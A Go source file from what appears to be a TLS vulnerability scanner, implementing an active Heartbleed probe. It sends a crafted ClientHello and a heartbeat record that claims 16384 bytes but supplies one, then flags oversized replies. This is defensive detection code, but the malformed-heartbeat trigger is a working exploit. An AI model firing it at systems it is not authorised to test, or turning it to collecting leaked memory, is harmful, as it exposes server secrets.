// Package vulns contains active vulnerability probes for the TLS scanner.
//
// These send hand-crafted bytes at the TLS record layer and interpret the
// server's response. They do NOT implement cryptography — they detect whether
// the server misbehaves in a way that signals a known flaw.
//
// License: MIT.
package vulns

import (
	"context"
	"encoding/binary"
	"net"
	"time"
)

// Heartbleed (CVE-2014-0160) detects whether the server leaks memory in
// response to a malformed TLS Heartbeat request.
//
// How it works: after a normal TLS 1.1/1.2 handshake we send a Heartbeat
// request whose declared payload length (claimedLen) is far larger than the
// actual payload we send. A patched server ignores or drops the malformed
// request. A vulnerable server trusts the length field and replies with a
// Heartbeat response containing up to claimedLen bytes of its own process
// memory. We only need to detect that an oversized response came back — we
// never inspect or store the leaked bytes.
//
// Returns (true, nil) if vulnerable, (false, nil) if not, error on transport.
func Heartbleed(ctx context.Context, addr string, timeout time.Duration) (bool, error) {
	d := &net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(timeout))

	// 1. Send a minimal TLS ClientHello advertising the Heartbeat extension.
	if _, err := conn.Write(clientHelloWithHeartbeat()); err != nil {
		return false, err
	}

	// 2. Read the server's handshake records until ServerHelloDone, then we can
	//    send the heartbeat. For a probe we tolerate reading whatever comes and
	//    proceed to send the malicious heartbeat; vulnerable servers respond
	//    even mid-handshake in many stacks. We drain available bytes first.
	if err := drainHandshake(conn, timeout); err != nil {
		return false, err
	}

	// 3. Send the malicious heartbeat: claim 0x4000 (16384) bytes of payload
	//    but actually send only 1 byte.
	if _, err := conn.Write(maliciousHeartbeat()); err != nil {
		return false, err
	}

	// 4. Read the reply. A heartbeat response record (content type 0x18) whose
	//    length is much larger than what we sent indicates a leak.
	vulnerable, err := readHeartbeatResponse(conn, timeout)
	if err != nil {
		// Connection reset / timeout typically means patched (request dropped).
		return false, nil
	}
	return vulnerable, nil
}

// --- TLS record helpers (record layer only, no crypto) ---

const (
	recordHandshake = 0x16
	recordHeartbeat = 0x18
	tlsVersion11    = 0x0302 // TLS 1.1; widely accepted for the probe
)

// clientHelloWithHeartbeat builds a ClientHello record that includes the
// Heartbeat extension (id 0x000f) so the server enables heartbeats.
func clientHelloWithHeartbeat() []byte {
	// Minimal handshake body. In production this is generated precisely; here we
	// use a compact, well-formed ClientHello with a small cipher list and the
	// heartbeat extension. Kept explicit for auditability.
	hello := []byte{
		// ClientHello
		0x01,             // handshake type: ClientHello
		0x00, 0x00, 0x2f, // length (placeholder, set below)
		0x03, 0x02, // client version TLS 1.1
	}
	// 32 bytes random
	random := make([]byte, 32)
	hello = append(hello, random...)
	hello = append(hello, 0x00) // session id length 0
	// cipher suites: just TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
	hello = append(hello, 0x00, 0x02, 0x00, 0x2f)
	// compression: null
	hello = append(hello, 0x01, 0x00)
	// extensions: heartbeat (0x000f), length 1, mode peer_allowed_to_send (1)
	ext := []byte{0x00, 0x0f, 0x00, 0x01, 0x01}
	hello = append(hello, byte(len(ext)>>8), byte(len(ext)))
	hello = append(hello, ext...)

	// fix handshake length (bytes 1..3)
	bodyLen := len(hello) - 4
	hello[1] = byte(bodyLen >> 16)
	hello[2] = byte(bodyLen >> 8)
	hello[3] = byte(bodyLen)

	return wrapRecord(recordHandshake, hello)
}

// maliciousHeartbeat builds a Heartbeat request claiming 16384 bytes payload
// but supplying only one. This is the actual Heartbleed trigger.
func maliciousHeartbeat() []byte {
	payload := []byte{
		0x01,       // heartbeat type: request
		0x40, 0x00, // claimed payload length = 16384
		0x01, // actual payload: 1 byte (the lie)
	}
	return wrapRecord(recordHeartbeat, payload)
}

// wrapRecord prepends a TLS record header (type, version, length) to body.
func wrapRecord(contentType byte, body []byte) []byte {
	rec := make([]byte, 5+len(body))
	rec[0] = contentType
	binary.BigEndian.PutUint16(rec[1:3], tlsVersion11)
	binary.BigEndian.PutUint16(rec[3:5], uint16(len(body)))
	copy(rec[5:], body)
	return rec
}

// drainHandshake reads whatever handshake records the server sends, with a
// short deadline, so the connection is ready for the heartbeat.
func drainHandshake(conn net.Conn, timeout time.Duration) error {
	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 4096)
	// One read is enough to consume the ServerHello flight in most stacks.
	_, err := conn.Read(buf)
	if ne, ok := err.(net.Error); ok && ne.Timeout() {
		return nil // proceed anyway
	}
	return err
}

// readHeartbeatResponse reads one record and decides if it is an oversized
// heartbeat response (leak). We requested 1 byte; anything materially larger
// in a heartbeat record means the server returned extra memory.
func readHeartbeatResponse(conn net.Conn, timeout time.Duration) (bool, error) {
	_ = conn.SetReadDeadline(time.Now().Add(timeout))
	header := make([]byte, 5)
	if _, err := readFull(conn, header); err != nil {
		return false, err
	}
	contentType := header[0]
	recLen := int(binary.BigEndian.Uint16(header[3:5]))

	if contentType != recordHeartbeat {
		return false, nil // alert or handshake => not leaking
	}
	// A heartbeat response echoing our 1-byte payload would be tiny.
	// A leaking server returns close to the claimed 16384 bytes.
	if recLen > 16 {
		// Drain the leaked bytes without inspecting them.
		_, _ = conn.Read(make([]byte, recLen))
		return true, nil
	}
	return false, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		if n > 0 {
			total += n
		}
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
